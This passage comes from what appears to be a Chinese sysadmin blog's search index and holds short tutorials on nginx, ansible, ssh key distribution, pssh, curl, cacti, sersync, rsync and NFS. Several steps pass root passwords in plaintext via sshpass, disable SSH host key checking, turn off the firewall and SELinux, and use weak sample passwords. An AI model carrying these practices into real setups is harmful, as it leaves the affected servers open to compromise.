匹配规则 URI重写后的内容 执行动作(标记); 使用字段：server, location, if 举例: 访问soulchild.com时，会自动跳转到www.soulchild.com server { listen 80; server_name soulchild.com; rewrite (^.*$) http://www.soulchild.com$1 permanent; } server { listen 80; server_name www.soulchild.com; location / { root /app/www; index index.html index.htm; access_log /app/logs/access_www.log main; 当匹配到以html结尾的URI时，进行rewrite，$1为匹配到(.*)的内容。 访问soulchild.cn/index.html时，将URI重写为/?p=index，在进行匹配其他location(last的作用) location ~ html$ { rewrite /(.*).html$ /?p=$1 last; } ","date":"2019-06-01 18:32","objectID":"/post/243/:0:0","tags":["nginx"],"title":"nginx中rewrite的使用","uri":"/post/243/"},{"categories":["系统服务"],"content":"安装htpasswd工具 yum install httpd-tools -y 生成密码文件 htpasswd -bc /application/nginx/conf/htpasswd 用户名 密码 chown www.www /application/nginx/conf/htpasswd chmod 400 /application/nginx/conf/htpasswd #参数： -b:非交互 -c:创建新文件 打开nginx或虚拟主机配置文件，在需要认证的页面中添加标红内容： ################################################# location /status/ { stub_status; auth_basic “describe”; auth_basic_user_file /application/nginx/conf/conf.d/htpasswd; } ################################################# 说明： auth_basic:网站描述 auth_basic_user_file:指定密码文件路径 重启服务 nginx -s reload ","date":"2019-06-01 18:31","objectID":"/post/241/:0:0","tags":["nginx"],"title":"nginx  auth_basic简易登录认证","uri":"/post/241/"},{"categories":["基础内容","ansible"],"content":"使用ansible需要先配置密钥认证，可参考https://www.soulchild.cn/204.html ansible在epel源中，需要先配置好源在进行安装。 yum install -y epel-release yum install -y ansible 安装完后修改/etc/ansible/ansible.cfg配置文件中的以下参数 host_key_checking= False 主机列表文件 /etc/ansible/hosts [root@m01 ~]# egrep -v “^$|#” /etc/ansible/hosts [soulchild] 172.16.1.7 172.16.1.31 172.16.1.41 ansible使用参数： -m:指定模块名 举例： [root@m01 ~]# ansible soulchild -m ping #soulchild需要改为对应的主机模块名，或者写all:代表所有主机 ","date":"2019-06-01 18:29","objectID":"/post/237/:0:0","tags":["ansible"],"title":"ansible安装配置并简单使用","uri":"/post/237/"},{"categories":["基础内容","常用命令"],"content":"#非交互生成密钥对,生成前确认.ssh目录下没有同名文件，否则会提示是否覆盖 [root@m01 ~]# ssh-keygen -t rsa -f /root/.ssh/id_rsa -P \"\" 参数： -t:指定算法 -f:指定文件路径以及文件名 -P:设置密码。““为空密码 sshpass -pmima ssh-copy-id -i /root/.ssh/id_rsa.pub -oStrictHostkeyChecking=no root@$n 参数： sshpass -p:指定密码 ssh-copy-id -i:指定公钥文件路径 -oStrictHostkeyChecking=no:临时关闭真实性提示 #使用脚本需要先在/tmp/ip_list文件中写好IP， [root@m01 scripts]# cat ssh-copy-id.sh #!/bin/bash if [ -f \"/root/.ssh/id_rsa\" ];then echo \"密钥已存在\" exit #rm -f /root/.ssh/id_rsa* fi ssh-keygen -t dsa -f /root/.ssh/id_rsa -P \"\" \u003e/dev/null 2\u003e\u00261 for ip in `cat /tmp/ip_list` do sshpass -pmima ssh-copy-id -i /root/.ssh/id_rsa.pub -oStrictHostkeyChecking=no root@$ip \u003e /dev/null 2\u003e\u00261 [ $? -eq 0 ] \u0026\u0026 echo \"$ip已分发完成\" || echo \"$ip分发失败\" done [root@m01 scripts]# pssh -ih /tmp/ip_list hostname [1] 23:07:41 [SUCCESS] 172.16.1.7 web01 [2] 23:07:41 [SUCCESS] 172.16.1.41 backup [3] 23:07:41 [SUCCESS] 172.16.1.31 nfs01 ","date":"2019-06-01 18:23","objectID":"/post/233/:0:0","tags":["密钥","ssh"],"title":"ssh批量分发公钥简易脚本","uri":"/post/233/"},{"categories":["基础内容","常用命令"],"content":"安装pssh(在epel源中) [root@m01 ~]# yum install -y pssh 参数说明： -h：指定主机列表文件,(文件内容格式:“user@host:port”,一行一个)，例:root@172.16.1.10:5832 -H：直接指定主机IP，格式同上 -p：指定线程数，并发执行(可选) -t：设置超时时间，0为无限(可选) -A：使用交互的形式输入密码(可选) -i：将每台服务器的正确信息和错误信息都打印出来 -P：打印出服务器返回信息(不清楚和-i的区别) 使用： #单台服务器执行远程命令 [root@m01 ~]# pssh -iH 172.16.1.31 hostname 批量执行命令(按照文件列表) [root@m01 ~]# cat host.txt 172.16.1.31 172.16.1.41 172.16.1.7 [root@m01 ~]# pssh -ih host.txt hostname [1] 23:54:56 [SUCCESS] 172.16.1.31 nfs01 [2] 23:54:56 [SUCCESS] 172.16.1.41 backup [3] 23:54:56 [SUCCESS] 172.16.1.7 web01 使用sshpass指定密码 [root@m01 ~]# sshpass -pxxxxxxx pssh -ih host.txt hostname ","date":"2019-06-01 18:21","objectID":"/post/230/:0:0","tags":["ssh","pssh"],"title":"pssh简单使用","uri":"/post/230/"},{"categories":["系统服务"],"content":"官方文档：http://nginx.org/en/docs/http/ngx_http_log_module.html 定义格式： #log_format main ‘$remote_addr - $remote_user [$time_local] “$request” ' # ‘$status $body_bytes_sent “$http_referer” ' # ‘\"$http_user_agent\" “$http_x_forwarded_for”’; #access_log logs/access.log main; ###################################################### log_format main： main的名字可以自定义，可以在http字段中使用 $remote_addr：客户端ip地址 $remote_user：远程用户，默认为空 $time_local：当前时间 $request：请求起始行 $status：状态码 $body_bytes_sent：返回给客户端的内容大小(字节) $http_referer：请求来源地址(即从哪个页面跳转过来的) $http_user_agent：用户使用的客户端 $http_x_forwarded_for：记录用户真实ip，使用负载均衡时会用到 access_log logs/access.log main gzip buffer=32k flush=5s; main:使用指定的日志格式 logs/access.log：日志保存的路径 gzip:保存为压缩包(可使用zcat,zless,zgrep查看) buffer:先存在内存中，达到32k时再写到日志文件中 flush:每5秒更新一次日志（写入） 可以在http, server, location, if in location, limit_except字段中使用 ","date":"2019-06-01 18:19","objectID":"/post/227/:0:0","tags":["nginx"],"title":"nginx日志格式说明","uri":"/post/227/"},{"categories":["监控"],"content":"##cacti0.8.8h安装笔记 设置时区 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ntpdate time.windows.com 关闭防火墙、selinux service iptables stop chkconfig iptables off setenforce 0 1.安装LAMP环境和snmp、rrdtool yum install -y httpd httpd-devel mysql-devel mysql-server mysql php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap net-snmp net-snmp-utils net-snmp-devel rrdtool php-snmp gcc 2.设置服务开机自启 chkconfig –level 35 httpd on chkconfig –level 35 mysqld on chkconfig –level 35 snmpd on 3.开启服务 service httpd start service mysqld start service snmpd start 4.设置mysql密码 mysqladmin -u root password Abc123.com 5.安装cacti wget http://www.cacti.net/downloads/cacti-0.8.8h.tar.gz tar zxvf ./cacti-0.8.8h.tar.gz cp -r cacti-0.8.8h/* /var/www/html/ 6.修改配置文件 vim /var/www/html/include/config.php #修改为如下参数： $database_type = “mysql”; $database_default = “cacti”; $database_hostname = “localhost”; $database_username = “cacti”; $database_password = “Abc123.com”; 7.配置mysql mysql -uroot -p #登陆mysql create database cacti; #创建库 GRANT ALL ON cacti.* TO cacti@localhost IDENTIFIED BY ‘Abc123.com’; #授权cacti用户本地访问，并设置密码为Abc123.com flush privileges; #刷新权限 quit; mysql -u cacti -p cacti \u003c /var/www/html/cacti.sql #导入cacti数据库 8.修改php时区 vim /etc/php.ini #修改如下内容 date.timezone = PRC #重启服务 service httpd restart 9.安装spine wget https://www.cacti.net/downloads/spine/cacti-spine-0.8.8h.tar.gz tar zxvf cacti-spine-0.8.8h.tar.gz cd cacti-spine-0.8.8h ./configure make \u0026\u0026 make install cp /usr/local/spine/etc/spine.conf.dist /etc/spine.conf vim /etc/spine.conf #修改为如下配置： DB_Host localhost DB_Database cacti DB_User cacti DB_Pass Abc123.com DB_Port 3306 10.添加计划任务 crontab -e */1 * * * * /usr/bin/php /var/www/html/poller.php \u003e /dev/null 2\u003e\u00261 11.图表中文显示 vim /var/www/html/lib/functions.php 在第二行添加如下内容： setlocale(LC_CTYPE,“zh_CN.UTF-8”); 安装中文字体 yum install -y wqy-zenhei-fonts 12.修改cacti默认URI vim /var/www/html/include/global.php 将第46行改为如下内容： $url_path = “/”; 13.登陆web页面 地址：http://IP/cacti 默认账号密码：admin 第一次登陆要求更改密码 14.设置cacti参数 Console -\u003e Cacti Settings -\u003e General 将SNMP Timeout修改为1000 Console -\u003e Cacti Settings -\u003e paths 将Spine Poller File Path修改为/usr/local/spine/bin/spine Console -\u003e Cacti Settings -\u003e Poller 将Poller Type改为spine，Poller Interval和cron Interval改为Every Minute Console -\u003e Cacti Settings -\u003e Poller 将Maximum SNMP OID’s 修改为1 Console -\u003e Utilities 点击Rebuild Poller Cache，重建缓存 ","date":"2019-06-01 18:15","objectID":"/post/225/:0:0","tags":["cacti"],"title":"centos6.5安装cacti0.8.8h","uri":"/post/225/"},{"categories":["系统服务"],"content":"#状态码模块 编译安装时需要指定–with-http_stub_status_module 在server字段中添加如下内容： location /status/ { stub_status; #1.75之前的版本使用stub_status on } 浏览器中输入IP/status/ 即10.0.0.7/status/，可以看到如下内容 ############################################# Active connections: 1 server accepts handled requests 3 3 7 Reading: 0 Writing: 1 Waiting: 0 ############################################# 含义说明： Active connections: 包括等待连接在内的当前活动客户端连接数。(与服务器已经建立的连接的连接数量, 当前并发数量) accepts：已接受的客户端连接总数 handled：已处理的连接总数(正常情况下与已接受的数量一致) requests：客户端一共发起的请求总数 Reading:nginx正在读取多少个用户的请求头 Writing:nginx正在响应多少用户的请求头 Waiting: 当前空闲客户端 等待连接的总数 官方给出的解释： Active connections The current number of active client connections including Waiting connections. accepts The total number of accepted client connections. handled The total number of handled connections. Generally, the parameter value is the same as accepts unless some resource limits have been reached (for example, the worker_connections limit). requests The total number of client requests. Reading The current number of connections where nginx is reading the request header. Writing The current number of connections where nginx is writing the response back to the client. Waiting The current number of idle client connections waiting for a request. ","date":"2019-06-01 18:14","objectID":"/post/223/:0:0","tags":["nginx"],"title":"nginx状态码模块配置信息说明","uri":"/post/223/"},{"categories":["系统服务"],"content":"官方文档：http://nginx.org/en/docs/http/ngx_http_core_module.html#location location主要用来匹配URI Syntax: location [ = | ~ | ~* | ^~ ] uri { … } location @name { … } Default: — Context: server, location =：精确匹配。优先级最高 ^~:不匹配正则表达式。优先级第二 ~:匹配正则表达式，不分区大小写。还可以使用逻辑操作符取反：!,!~,!~。优先级第三 ~：匹配正则表达式，区分大小写。优先级第四 location = / { 访问的地址uri部分没有内容和只有/的时候匹配 [ configuration A ] } location / { 默认规则 其他条件都不匹配的时候使用此规则 [ configuration B ] } location /documents/ { 匹配路径(uri中包含指定的目录时匹配) www.soulchild.cn/documents/访问此地址时会匹配成功 [ configuration C ] } location ^~ /images/ { 优先匹配路径(uri中包含指定的目录时匹配) www.soulchild.cn/images/admin可以匹配成功 [ configuration D ] } location ~* .(gif|jpg|jpeg)$ { 正则匹配 不区分大小写，访问的uri中以指定内容结尾时匹配成功 [ configuration E ] } 举例：只有指定ip可以访问admin目录，其他人禁止访问 location /admin/ { root /app/www/; index index.html; allow 10.0.0.0/24; deny all; } ","date":"2019-06-01 18:12","objectID":"/post/220/:0:0","tags":["nginx"],"title":"nginx配置文件的location规则配置","uri":"/post/220/"},{"categories":["基础内容","常用命令"],"content":" curl参数说明： -v 显示请求详细信息 -H 修改请求头部内容 举例：curl -v -H Host:www.baidu.com www.soulchild.com -I 只显示请求头部 -o 将网页访问结果内容保存到指定位置 -O 将网页访问结果内容按照服务器的文件名保存到本地 -s 静默模式。不显示进度表或错误消息。 -w 按照指定格式输出 -L 跟随重定向跳转 -X 指定访问方式GET、POST -d 指定POST提交数据 –data-ascii \u003cdata\u003e 以ascii的方式post数据 –data-binary \u003cdata\u003e 以二进制的方式post数据 -c 操作结束后把cookie写入到这个文件中 -b cookie字符串或文件读取位置 取http状态码方法1： curl -s -w “%{http_code}\\n” -o /dev/null www.soulchild.com 取http状态码方法2： curl -s -I www.soulchild.com | awk ‘NR==1{print $2}’ 查看响应时间: curl -s -w ’ dns:%{time_namelookup}, conn:%{time_connect}, c-s_resp:%{time_starttransfer}, total:%{time_total}, down:%{speed_download}byte/s ’ 1.1.1.1:8080/actuator/health/liveness ","date":"2019-06-01 18:06","objectID":"/post/214/:0:0","tags":[],"title":"curl命令简单使用","uri":"/post/214/"},{"categories":["系统服务"],"content":"[root@web01 nginx]# egrep -v ‘^$|#’ conf/nginx.conf.default worker_processes 1; # 工作进程数量(建议设置与cpu核心数一致) events { worker_connections 1024; # 每个工作进程支持最大连接数 } http { include mime.types; # nginx支持的媒体类型 default_type application/octet-stream; # 默认的媒体类型 sendfile on; # 开启高效传输模式 keepalive_timeout 65; # 存活超时时间(一次连接保留65秒) server { listen 80; # 监听端口 server_name localhost; # 绑定的域名 location / { # 默认location规则 root html; # 默认站点目录 index index.html index.htm; # 默认主页文件 } error_page 500 502 503 504 /50x.html; # 遇到这些状态码都会跳转50x.html location = /50x.html { # URI的内容是/50x.html root html; # 在此目录找50x.html } } } ","date":"2019-06-01 18:05","objectID":"/post/212/:0:0","tags":[],"title":"nginx配置文件说明","uri":"/post/212/"},{"categories":["系统服务"],"content":"下载地址：http://nginx.org/download/nginx-1.14.2.tar.gz ","date":"2019-06-01 18:04","objectID":"/post/210/:1:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"安装开发依赖环境： yum install -y pcre-devel openssl-devel ","date":"2019-06-01 18:04","objectID":"/post/210/:2:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"创建nginx运行用户： useradd -g nginx -s /sbin/nologin -M www ","date":"2019-06-01 18:04","objectID":"/post/210/:3:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"编译安装nginx： mkdir -p /server/tools cd /server/tools wget -P ./ http://nginx.org/download/nginx-1.14.2.tar.gz tar zxvf nginx-1.14.2.tar.gz cd nginx-1.14.2/ ./configure --prefix=/application/nginx-1.14.2 --user=www --group=www --with-http_stub_status_module --with-http_ssl_module ","date":"2019-06-01 18:04","objectID":"/post/210/:4:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"参数说明： –prefix=/application/nginx-1.14.2 #指定安装位置 –user=www #指定运行用户 –group=www #指定运行用户组 –with-http_stub_status_module #安装状态模块 –with-http_ssl_module #安装ssl模块，实现https ","date":"2019-06-01 18:04","objectID":"/post/210/:4:1","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"编译\u0026安装 make \u0026\u0026 make install ","date":"2019-06-01 18:04","objectID":"/post/210/:5:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"创建软连接，方便以后使用 ln -s /application/nginx-1.14.2 /application/nginx ln -s /application/nginx/sbin/nginx /sbin/nginx ","date":"2019-06-01 18:04","objectID":"/post/210/:6:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"启动服务 nginx ","date":"2019-06-01 18:04","objectID":"/post/210/:7:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"常用命令说明： nginx -s stop #停止服务 nginx -s reload #平滑重启服务 nginx -t #检查配置文件 ","date":"2019-06-01 18:04","objectID":"/post/210/:7:1","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"简化配置文件 cd /application/nginx/conf/ egrep -v '^$|#' nginx.conf.default \u003e nginx.conf ","date":"2019-06-01 18:04","objectID":"/post/210/:8:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["系统服务"],"content":"配置logrotate： vim /etc/logrotate.d/nginx /application/nginx-1.14.2/logs/*log { create 0664 www root daily rotate 10 dateext missingok notifempty compress sharedscripts postrotate /bin/kill -USR1 `cat /application/nginx/logs/nginx.pid 2\u003e/dev/null` 2\u003e/dev/null || true endscript } ","date":"2019-06-01 18:04","objectID":"/post/210/:9:0","tags":["nginx"],"title":"centos7-nginx1.14.2编译安装","uri":"/post/210/"},{"categories":["基础内容"],"content":"PV(访问量)：Page View, 即页面浏览量或点击量，用户每次刷新即被计算一次。 UV(独立访客)：Unique Visitor,一般使用cookie标记,访问您网站的一台电脑客户端 IP(独立IP)：指独立IP数。00:00-24:00内相同IP地址之被计算一次(多台电脑可能共用一个ip)。 ","date":"2019-06-01 18:03","objectID":"/post/208/:0:0","tags":[],"title":"衡量网站访问量的单位:IP,PV,UV含义","uri":"/post/208/"},{"categories":["基础内容","常用命令"],"content":" [root@m01 ~]# ssh 172.16.1.7 hostname The authenticity of host '172.16.1.7 (172.16.1.7)' can't be established. ECDSA key fingerprint is SHA256:qI7TJf59/RPaLxO+x7DZN88pU7WFjuZ2yYpPKvJmicg. ECDSA key fingerprint is MD5:af:2a:5a:5e:f9:d1:83:1e:e6:17:bc:a8:6d:0b:c4:e5. Are you sure you want to continue connecting (yes/no)? -oStrictHostKeyChecking=no:解决第一次登陆提示（如上） ","date":"2019-06-01 18:01","objectID":"/post/206/:0:0","tags":["ssh","pssh"],"title":"使用sshpass实现非交互连接服务器","uri":"/post/206/"},{"categories":["基础内容","常用命令"],"content":"sshpass工具需要单独安装，它可以为ssh相关命令提供密码 ","date":"2019-06-01 18:01","objectID":"/post/206/:1:0","tags":["ssh","pssh"],"title":"使用sshpass实现非交互连接服务器","uri":"/post/206/"},{"categories":["基础内容","常用命令"],"content":"sshpass在epel源中，需要先配置epel源在进行安装，也可以安装ansible(自带sshpass)或者使用源代码安装 [root@m01 ~]# yum install -y epel-release [root@m01 ~]# yum install -y sshpass [root@m01 ~]# sshpass -p123456 -oStrictHostKeyChecking=no ssh root@172.16.1.41 hostname backup ","date":"2019-06-01 18:01","objectID":"/post/206/:2:0","tags":["ssh","pssh"],"title":"使用sshpass实现非交互连接服务器","uri":"/post/206/"},{"categories":["基础内容","常用命令"],"content":"~/.ssh/目录文件说明： authorized_keys:记录公钥的文件，对端的私钥和此文件中的公钥匹配成功即可登录 id_rsa : 生成的私钥文件 id_rsa.pub ： 生成的公钥文件 目录文件权限： .ssh目录：700 .ssh/authorized_keys文件：600 #生成秘钥对 [root@m01 ~]# ssh-keygen -t dsa Generating public/private dsa key pair. Enter file in which to save the key (/root/.ssh/id_dsa): Created directory ‘/root/.ssh’. Enter passphrase (empty for no passphrase): Enter same passphrase again: 。。。。。。省略 #将公钥发送到其他服务器中 -i:指定公钥文件 [root@m01 ~]# ssh-copy-id -i /root/.ssh/id_dsa.pub root@172.16.1.41 #测试远程执行命令 [root@m01 ~]# ssh 172.16.1.41 hostname backup ","date":"2019-06-01 17:59","objectID":"/post/204/:0:0","tags":["ssh","秘钥"],"title":"ssh密钥认证","uri":"/post/204/"},{"categories":["系统服务"],"content":"sersync github下载地址：https://github.com/wsgzao/sersync/ (下载这个sersync2.5.4_64bit_binary_stable_final.tar.gz) sersync：监控目录的变化，推送到rsync服务器上 这里检测到指定目录文件有变化时会自动调用rsync同步到backup服务器中(backup服务器安装rsync服务) ","date":"2019-06-01 17:58","objectID":"/post/202/:0:0","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["系统服务"],"content":"1、安装 解压后得到两个文件:sersync，confxml.xml,移动到/usr/local/sersync目录下（目录结构可以自己创建） [root@nfs01 ~]# tree /usr/local/sersync/ /usr/local/sersync/ ├── bin │ └── sersync ├── conf │ └── confxml.xml └── logs #创建软连接，方便以后使用 [root@nfs01 sersync]# ln -s /usr/local/sersync/bin/sersync /bin/ [root@nfs01 sersync]# chmod +x /usr/local/sersync/bin/sersync ","date":"2019-06-01 17:58","objectID":"/post/202/:1:0","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["系统服务"],"content":"2、修改配置文件 打开confxml.xml配置文件 \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?\u003e - \u003chead version=\"2.5\"\u003e \u003chost hostip=\"localhost\" port=\"8008\" /\u003e \u003cdebug start=\"false\" /\u003e \u003cfileSystem xfs=\"true\" /\u003e # 文件系统类型，根据自己的分区类型选择 # 此处可设置需要过滤的文件类型 - \u003cfilter start=\"false\"\u003e \u003cexclude expression=\"(.*)\\.svn\" /\u003e \u003cexclude expression=\"(.*)\\.gz\" /\u003e \u003cexclude expression=\"^info/*\" /\u003e \u003cexclude expression=\"^static/*\" /\u003e \u003c/filter\u003e - \u003cinotify\u003e # 监控文件目录的变化 \u003cdelete start=\"true\" /\u003e \u003ccreateFolder start=\"true\" /\u003e \u003ccreateFile start=\"false\" /\u003e \u003ccloseWrite start=\"true\" /\u003e \u003cmoveFrom start=\"true\" /\u003e \u003cmoveTo start=\"true\" /\u003e \u003cattrib start=\"false\" /\u003e \u003cmodify start=\"false\" /\u003e \u003c/inotify\u003e - \u003csersync\u003e - \u003clocalpath watch=\"/data\"\u003e # 监控的目录 \u003cremote ip=\"172.16.1.41\" name=\"nfsbackup\" /\u003e # rsync服务器的IP(也就是backup服务器)和模块名称 - \u003c!-- \u003cremote ip=\"192.168.8.39\" name=\"tongbu\"/\u003e--\u003e - \u003c!-- \u003cremote ip=\"192.168.8.40\" name=\"tongbu\"/\u003e--\u003e \u003c/localpath\u003e - \u003crsync\u003e \u003ccommonParams params=\"-az\" /\u003e # rsync命令执行参数 \u003cauth start=\"true\" users=\"nfsbackup\" passwordfile=\"/etc/nfsbackup.password\" /\u003e # users:rsync认证用户名，passwordfile:密码文件 \u003cuserDefinedPort start=\"false\" port=\"874\" /\u003e - \u003c!-- port=874 --\u003e \u003ctimeout start=\"false\" time=\"100\" /\u003e - \u003c!-- timeout=100 --\u003e \u003cssh start=\"false\" /\u003e \u003c/rsync\u003e \u003cfailLog path=\"/tmp/rsync_fail_log.sh\" timeToExecute=\"60\" /\u003e # 日志文件路径 - \u003c!-- default every 60mins execute once --\u003e - \u003ccrontab start=\"false\" schedule=\"600\"\u003e - \u003c!-- 600mins --\u003e - \u003ccrontabfilter start=\"false\"\u003e \u003cexclude expression=\"*.php\" /\u003e \u003cexclude expression=\"info/*\" /\u003e \u003c/crontabfilter\u003e \u003c/crontab\u003e \u003cplugin start=\"false\" name=\"command\" /\u003e \u003c/sersync\u003e - \u003cplugin name=\"command\"\u003e \u003cparam prefix=\"/bin/sh\" suffix=\"\" ignoreError=\"true\" /\u003e - \u003c!-- prefix /opt/tongbu/mmm.sh suffix --\u003e - \u003cfilter start=\"false\"\u003e \u003cinclude expression=\"(.*)\\.php\" /\u003e \u003cinclude expression=\"(.*)\\.sh\" /\u003e \u003c/filter\u003e \u003c/plugin\u003e - \u003cplugin name=\"socket\"\u003e - \u003clocalpath watch=\"/opt/tongbu\"\u003e \u003cdeshost ip=\"192.168.138.20\" port=\"8009\" /\u003e \u003c/localpath\u003e \u003c/plugin\u003e - \u003cplugin name=\"refreshCDN\"\u003e - \u003clocalpath watch=\"/data0/htdocs/cms.xoyo.com/site/\"\u003e \u003ccdninfo domainname=\"ccms.chinacache.com\" port=\"80\" username=\"xxxx\" passwd=\"xxxx\" /\u003e \u003csendurl base=\"http://pic.xoyo.com/cms\" /\u003e \u003cregexurl regex=\"false\" match=\"cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images\" /\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003c/head\u003e ","date":"2019-06-01 17:58","objectID":"/post/202/:2:0","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["系统服务"],"content":"主要修改位置 \u003cfileSystem xfs=\"true\"/\u003e #使用xfs文件系统 \u003clocalpath watch=\"/data\"\u003e #指定需要监控的目录 \u003cremote ip=\"172.16.1.41\" name=\"nfsbackup\"/\u003e # 指定rsync服务器的ip和模块名 \u003ccommonParams params=\"-az\"/\u003e # 使用-az参数 \u003cauth start=\"true\" users=\"nfsbackup\" passwordfile=\"/etc/nfsbackup.password\"/\u003e # 指定用户名为：nfsbackup和密码文件 ","date":"2019-06-01 17:58","objectID":"/post/202/:2:1","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["系统服务"],"content":"配置backup服务器（rsync服务） [root@backup uploads]# cat /etc/rsyncd.conf uid = rsync gid = rsync fake super = yes use chroot = no max connections = 200 timeout = 300 pid file = /var/run/rsyncd.pid lock file = /var/run/rsync.lock log file = /var/log/rsyncd.log ignore errors read only = false list = false hosts allow = 172.16.1.0/24 #hosts deny = 0.0.0.0/32 [backup] path = /backup/ auth users = backup secrets file = /etc/backup.password [nfsbackup] path = /nfsbackup auth users = nfsbackup secrets file = /etc/nfsbackup.password ","date":"2019-06-01 17:58","objectID":"/post/202/:3:0","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["系统服务"],"content":"启动sersync守护进程模式 查看帮助 [root@nfs01 bin]# sersync -h set the system param execute：echo 50000000 \u003e /proc/sys/fs/inotify/max_user_watches execute：echo 327679 \u003e /proc/sys/fs/inotify/max_queued_events parse the command param 参数-d:启用守护进程模式 参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍 参数-n: 指定开启守护线程的数量，默认为10个 参数-o:指定配置文件，默认使用confxml.xml文件 参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块 参数-m:单独启用其他模块，使用 -m socket 开启socket模块 参数-m:单独启用其他模块，使用 -m http 开启http模块 不加-m参数，则默认执行同步程序 ##开启服务 sersync -r -d -o /usr/local/sersync/conf/confxml.xml 在首次正常执行后，此时/data目录的内容会全部推送到backup服务器的/nfsbackup目录下 ","date":"2019-06-01 17:58","objectID":"/post/202/:4:0","tags":["rsync"],"title":"sersync实现实时同步备份","uri":"/post/202/"},{"categories":["基础内容","常用命令"],"content":"#rsync服务器和nfs服务器都需要安装nfs工具 yum install -y nfs-utils rpcbind 服务端配置 #服务端启动nfs和rpcbind [root@nfs01 ~]# systemctl start rpcbind [root@nfs01 ~]# systemctl start nfs #查看rpc注册信息 [root@nfs01 ~]# rpcinfo -p localhost #查看nfs共享的目录 [root@nfs01 ~]# showmount -e locahost Export list for localhost: #配置nfs共享目录 [root@nfs01 ~]# vim /etc/exports #share /data /data 172.16.1.0/24(rw,sync,all_squash) ############################################################################ 第一行:注释说明 第二行:共享的目录和允许访问的ip段，rw:读写权限，sync:实时同步,all_squash:将所有用户压缩为nfsnobody所有者和组 权限参数： 只读:ro 读写:rw all_squash还可以改为如下内容 root_squash:如果客户端用户是root用户访问将被压缩为nfsnobody所有者和组 no_root_squash:如果客户端用户是root用户，那么他对共享目录的权限为root 默认压缩的用户为nfsnobody，手动指定举例： /data 172.16.1.0/24(rw,sync,all_squash,anonuid=888,anongid=888) anonuid:用户id anongid:组id 对应的共享目录(/data)也需要将所有者和组更改为与上面设置一致 ############################################################################ #创建目录并将所有者改为nfsnobody [root@nfs01 ~]# mkdir -p /data [root@nfs01 ~]# chown nfsnobody.nfsnobody /data #平滑重启nfs服务 [root@nfs01 ~]# systemctl reload nfs #查看nfs共享目录 [root@nfs01 ~]# showmount -e locahost Export list for locahost: /data 172.16.1.0/24 客户端挂载 #挂载nfs服务器的/data目录挂载到rsync服务器的/mnt目录下(-t参数指定文件系统类型) [root@backup ~]# mount -t nfs 172.16.1.31:/data /mnt #查看磁盘挂载情况，可以看到结果中存在以下内容 [root@backup ~]# df -Th 172.16.1.31:/data nfs4 48G 1.9G 47G 4% /mnt #设置开机自动挂载 #centos7需要设置执行权限 [root@backup ~]# chmod +x /etc/rc.d/rc.local #在rc.local文件末尾添加如下内容 mount -t nfs 172.16.1.31:/data /mnt ","date":"2019-06-01 17:57","objectID":"/post/200/:0:0","tags":["rsync","nfs"],"title":"配置nfs并挂载使用","uri":"/post/200/"},{"categories":["系统服务"],"content":"备份服务器搭建服务器端 backup ","date":"2019-06-01 12:17","objectID":"/post/195/:0:0","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"服务端配置 ","date":"2019-06-01 12:17","objectID":"/post/195/:1:0","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"创建rsync用户 useradd -s /sbin/nologin -M rsync ","date":"2019-06-01 12:17","objectID":"/post/195/:1:1","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"创建备份目录 mkdir -p /backup ","date":"2019-06-01 12:17","objectID":"/post/195/:1:2","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"修改目录所有者和组为rsync chown rsync.rsync /backup/ ","date":"2019-06-01 12:17","objectID":"/post/195/:1:3","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"创建rsync用户密码文件，账号rsync_backup,密码1 echo ‘rsync_backup:1’ \u003e/etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:1:4","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"修改密码文件权限 chmod 600 /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:1:5","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"修改配置文件，内容如下： [root@backup ~]# cat /etc/rsyncd.conf uid = rsync gid = rsync fake super = yes use chroot = no max connections = 200 timeout = 300 pid file = /var/run/rsyncd.pid lock file = /var/run/rsync.lock log file = /var/log/rsyncd.log [backup] path = /backup/ ignore errors read only = false list = false hosts allow = 172.16.1.0/24 #hosts deny = 